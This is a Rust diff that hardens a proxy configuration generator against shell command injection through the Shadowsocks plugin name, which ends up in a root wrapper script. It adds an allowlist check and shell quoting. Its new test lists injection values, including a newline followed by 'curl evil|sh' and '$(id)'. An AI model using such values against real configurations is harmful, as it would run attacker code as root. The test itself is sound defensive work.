@@ -57,7 +57,10 @@ pub fn gen_config(node: Option<&Section>, var: &Args) -> SsConfig {
     let mut plugin_file: Option<String> = None;
     let mut plugin: Option<(String, String)> = None;
     let np = node.s("plugin");
-    if !np.is_empty() && np != "none" {
+    if !np.is_empty() && np != "none" && !is_valid_plugin(&np) {
+        // the value comes from share links / subscriptions; it ends up in a root shell script
+        api::log(1, &format!("Invalid SS plugin name ignored: {}", np.escape_debug()));
+    } else if !np.is_empty() && np != "none" {
         let sh = var.g("plugin_sh").unwrap_or("").to_string();
         plugin_file = Some(if !sh.is_empty() { sh.clone() } else { np.clone() });
         plugin = Some((sh, np.clone()));
@@ -114,22 +117,35 @@ pub fn gen_config(node: Option<&Section>, var: &Args) -> SsConfig {
     SsConfig { config: Some(config), plugin }
 }
 
-/// Content of the plugin wrapper script (`plugin_sh`, pid file = `.sh` → `.pid`).
-pub fn plugin_script(plugin_sh: &str, plugin_bin: &str) -> String {
+/// SS plugin name/path (`obfs-local`, `v2ray-plugin`, `/usr/bin/xray-plugin`, ...):
+/// `[A-Za-z0-9._+/-]+`, not starting with `-`. Anything else (spaces, `;`, `$`, newlines, ...)
+/// would be shell syntax in [`plugin_script`] or an option to sslocal.
+pub fn is_valid_plugin(p: &str) -> bool {
+    !p.is_empty() && p.len() <= 256 && !p.starts_with('-') && p.bytes().all(|c| c.is_ascii_alphanumeric() || b"._+/-".contains(&c))
+}
+
+/// Content of the plugin wrapper script (`plugin_sh`, pid file = `.sh` → `.pid`). None for
+/// an invalid plugin name (see [`is_valid_plugin`]). Both paths are shell-quoted.
+pub fn plugin_script(plugin_sh: &str, plugin_bin: &str) -> Option<String> {
+    if !is_valid_plugin(plugin_bin) {
+        return None;
+    }
     let pid = match plugin_sh.strip_suffix(".sh") {
         Some(b) => format!("{}.pid", b),
         None => plugin_sh.to_string(),
     };
-    format!(
-        "#!/bin/sh\nexport PATH=/usr/sbin:/usr/bin:/sbin:/bin:/root/bin:$PATH\n{} $@ &\necho $! > {}\nwait\n",
-        plugin_bin, pid
-    )
+    Some(format!(
+        "#!/bin/sh\nexport PATH=/usr/sbin:/usr/bin:/sbin:/bin:/root/bin:$PATH\n{} \"$@\" &\necho $! > {}\nwait\n",
+        crate::util::shq(plugin_bin),
+        crate::util::shq(&pid)
+    ))
 }
 
 /// Write the plugin wrapper (only when `plugin_sh` is non-empty) and make it executable.
 pub fn write_plugin(plugin: &Option<(String, String)>) {
     if let Some((sh, bin)) = plugin {
-        if !sh.is_empty() && !bin.is_empty() && std::fs::write(sh, plugin_script(sh, bin)).is_ok() {
+        let Some(script) = plugin_script(sh, bin) else { return };
+        if !sh.is_empty() && std::fs::write(sh, script).is_ok() {
             use std::os::unix::fs::PermissionsExt;
             let _ = std::fs::set_permissions(sh, std::fs::Permissions::from_mode(0o755));
         }
@@ -191,7 +207,9 @@ mod tests {
         assert_eq!(v["locals"][1]["local_address"], "0.0.0.0");
         assert_eq!(v["fast_open"], false);
         assert_eq!(r.plugin, Some(("/tmp/etc/passwall2/s1_plugin.sh".into(), "obfs-local".into())));
-        assert!(plugin_script("/tmp/a_plugin.sh", "obfs-local").contains("echo $! > /tmp/a_plugin.pid\n"));
+        let sc = plugin_script("/tmp/a_plugin.sh", "obfs-local").unwrap();
+        assert!(sc.contains("echo $! > '/tmp/a_plugin.pid'\n"), "{}", sc);
+        assert!(sc.contains("\n'obfs-local' \"$@\" &\n"), "{}", sc);
     }
 
     #[test]
@@ -221,5 +239,21 @@ mod tests {
         assert_eq!(v["server"], "::");
         assert_eq!(v["server_port"], 9000);
         assert_eq!(v["password"], "");
+    }
+
+    #[test]
+    fn plugin_injection_refused() {
+        assert!(is_valid_plugin("obfs-local") && is_valid_plugin("/usr/bin/v2ray-plugin") && is_valid_plugin("xray-plugin_1.8+x"));
+        for bad in ["obfs-local\ncurl evil|sh", "a;b", "a b", "$(id)", "`id`", "-x", "a|b", "a'b", ""] {
+            assert!(!is_valid_plugin(bad), "{:?}", bad);
+            assert!(plugin_script("/tmp/a_plugin.sh", bad).is_none());
+        }
+        let c = Config::parse(
+            "passwall2",
+            "config nodes 'n1'\n\toption type 'SS-Rust'\n\toption address 'ex.com'\n\toption port '1'\n\toption plugin 'obfs-local\ncurl evil|sh'\n",
+        );
+        let r = gen_config(c.section("n1"), &args(&[("node", "n1"), ("local_socks_port", "1080"), ("plugin_sh", "/tmp/x_plugin.sh")]));
+        assert!(r.plugin.is_none());
+        assert!(r.config.unwrap()["servers"][0].get("plugin").is_none());
     }
 }
